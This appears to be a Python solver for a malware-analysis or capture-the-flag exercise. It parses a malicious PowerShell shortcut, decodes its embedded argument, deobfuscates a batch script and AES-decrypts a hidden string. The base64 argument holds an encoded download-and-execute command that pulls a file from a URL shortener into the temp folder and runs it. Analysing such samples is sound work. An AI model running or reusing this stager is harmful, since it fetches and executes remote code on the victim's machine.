#!/usr/bin/env python3
import base64
import re
from pathlib import Path

import LnkParse3
from Cryptodome.Cipher import AES


def parse_lnk():
    with open(Path(__file__).parent.joinpath('Windows PowerShell.lnk'), 'rb') as indata:
        lnk = LnkParse3.lnk_file(indata)
        # lnk.print_json()
        print(lnk.lnk_command)


def analyze():
    ps_cmd_arg = 'aQB3AHIAIABpAHMALgBnAGQALwBqAHcAcgA3AEoARAAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA='
    print(base64.b64decode(ps_cmd_arg.encode()).decode('utf-16'))


def deobfuscate():
    lookup1 = {}
    lookup2 = {}

    with open(Path(__file__).parent.joinpath('try1'), 'rb') as f:
        for line in f.readlines():
            line = line.decode().strip()
            if match := re.match(r'set /a (\w+)=(\d+) %% (\d+)', line):
                lookup1[match.group(1)] = int(match.group(2)) % int(match.group(3))
            if match := re.match(r'cmd /c exit %(\w+)%', line):
                exit_code_val = lookup1.get(match.group(1))
            if match := re.match(r'set (\w+)=%=exitcodeAscii%', line):
                lookup2[match.group(1)] = chr(exit_code_val)

    with open(Path(__file__).parent.joinpath('try1.1'), 'r') as f:
        content = f.read()
        for key, value in lookup2.items():
            content = content.replace(f'%{key}%', value)

    with open(Path(__file__).parent.joinpath('try1.2'), 'w') as f:
        f.write(content)


def decrypt():
    """
    byte[] c = Convert.FromBase64String("RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw");
    byte[] k = Convert.FromBase64String("/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=");
    byte[] i = Convert.FromBase64String("9sXGmK4q9LdYFdOp4TSsQw==");
    """
    ciphertext = base64.b64decode('RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw')
    key = base64.b64decode('/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=')
    iv = base64.b64decode('9sXGmK4q9LdYFdOp4TSsQw==')

    print(AES.new(key, AES.MODE_CBC, iv).decrypt(ciphertext).decode().strip())


def main():
    parse_lnk()
    analyze()
    deobfuscate()
    decrypt()


if __name__ == '__main__':
    main()
